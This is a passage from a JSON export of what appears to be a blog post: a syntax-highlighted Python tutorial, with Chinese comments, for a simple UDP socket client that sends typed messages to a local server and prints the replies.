data-num=\"7\"></td><td><pre>传输完毕，关闭套接字</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># client 发送端</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>client_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_DGRAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>server_address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9977</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 接收方 服务器的 ip 地址和端口号</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>strftime<span class=\"token punctuation\">(</span><span class=\"token string\">'%Y-%m-%d %H:%M:%S'</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 以指定格式显示当前时间</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(*^▽^*)客户端，请输入要发送的内容：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    client_socket<span class=\"token punctuation\">.</span>sendto<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> server_address<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将 msg 内容发送给指定接收方</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> msg <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token string\">\"结束通讯 (￢_￢)瞄\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    receive_data<span class=\"token punctuation\">,</span> server <span class=\"token operator\">=</span> client_socket<span class=\"token punctuation\">.</span>recvfrom<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(︶.̮︶✽)接收到来自&#123;&#125;端口为&#123;&#125;的信息:\\n**********\\n&#123;&#125;\\n**********\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>server<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> server<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> receive_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "socket"
            ]
        }
    ]
}